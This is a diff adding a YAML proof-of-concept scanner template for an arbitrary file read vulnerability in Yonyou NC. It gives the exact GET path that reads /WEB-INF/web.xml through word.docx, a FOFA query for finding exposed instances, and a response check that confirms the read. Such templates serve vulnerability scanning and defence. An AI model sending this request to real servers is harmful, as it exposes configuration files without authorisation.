@@ -1,0 +1,16 @@
+id: poc-yaml-yongyou-nc-word-docx-anyfile-read
+info:
+  name: 用友NC word.docx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"web-app\") && \ncontains(body,\"\
+    <display-name>NC Portal</display-name>\") &&\ncontains(body,\"<filter>\") &&\n\
+    contains(headers,\"application/xml\")\n"
+variables: {}
+transport: http
